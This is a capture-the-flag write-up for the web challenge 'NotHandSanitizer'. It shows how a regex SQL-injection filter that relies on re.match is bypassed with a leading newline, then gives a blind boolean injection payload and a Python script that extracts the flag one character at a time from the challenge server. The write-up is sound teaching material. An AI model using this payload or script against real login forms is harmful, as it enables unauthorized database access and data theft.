# web/NotHandSanitizer
### 990 pts, 5 solves

## Description
APOCALYPSE has recently implemented a security feature called NotHandSanitizer™ to secure their [member login portal](http://chals.cyberthon22f.ctf.sg:40401/).

We heard that there's a flag somewhere in their database, but we can't seem to find a working attack vector since SQL Injections seem impossible due to NotHandSanitizer™. Perhaps you could take a look for us?

[Attachement (main.py)](assets/nhs-main.py)

## Solution
Of course, from the title, we know this is a challenge to bypass sqli sanitisers.

Browsing the source code, we see the sanitising function:
```py
def is_sqli(check):  # NotHandSanitizer™ SQL Injection Sanitizer
    m = re.match(
        r".*([\[\]\{\}:\\|;?!~`@#$%^&*()_+=-]|[ ]|[']|[\"]|[<]|[>]).*",
        check,
        re.MULTILINE,
    )
    if m is not None:
        return True
    return False
```
<br/><br/><br/>

## How to bypass sanitation

Reading the [re module docs](https://docs.python.org/3/library/re.html), we find out that:<br/>
`Note that even in MULTILINE mode, re.match() will only match at the beginning of the string and not at the beginning of each line.`

This means we need to simply enter a newline before using "illegal" characters that would have been filtered out.

For example, we can send `admin\n' OR 1 == 1 -- ` as the username, and it will not be sanitised, and will run.
<br/><br/><br/>

## Exfiltration of flag

The page only returns set statements `Login failed!`, `Not authorized!`, and `Welcome to Apocalypse`.

The code responsible for returning the status is shown below
```py
if is_sqli(username) or is_sqli(password):
            return "Login failed!"
        query = f"SELECT username FROM users WHERE username='{username}' AND password='{password}'"
        logged_in_user = await database.fetch_one(query=query)
        if not logged_in_user:
            return "Login failed!"
        if logged_in_user['username'] != 'admin':
            return "Not authorized!"
        return "Welcome to Apocalypse"
```

We decide to use the responses `Login failed!` and `Welcome to Apocalypse` to help exfiltrate the flag.

We need the query to either return `admin`, or nothing, so we need a `True`/`False` condition.

To do this, we can:
1. Take a random character, from a list of characters
2. Append the character to the current known flag
3. Check if the string from 2. is a substring of the flag in the database
4. Repeat steps 1-3


Original query: `"SELECT username FROM users WHERE username='{username}' AND password='{password}'"`

Query after injection: `"SELECT username FROM users WHERE username='admin\n' UNION SELECT username FROM users WHERE username = 'admin' AND EXISTS (SELECT flag FROM flags WHERE SUBSTR(flag,1,{len(flag)+1}) = '{flag}{c}') -- ' AND password='a'"`

[Here is a simple solve script](assets/nhs-solve.py)
```py
import requests

charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$@{}_"
flag = ""

password = "a"

while True:
    for c in charset:
        print(f"CHECKING {c} |  ", end="")
        username = f"admin\n' UNION SELECT username FROM users WHERE username = 'admin' AND EXISTS (SELECT flag FROM flags WHERE SUBSTR(flag,1,{len(flag)+1}) = '{flag}{c}') -- "
        # print(username)
        r = requests.post("http://chals.cyberthon22f.ctf.sg:40401/login/", data = {'username': username, 'password': password})
        if "Welcome" in r.text:
            flag += c
        print(f"flag: {flag} ")

```

> cyberthon{th15_54n1t1z3r_15_4_d15gr4c3_t0_s4n1t1z3r5}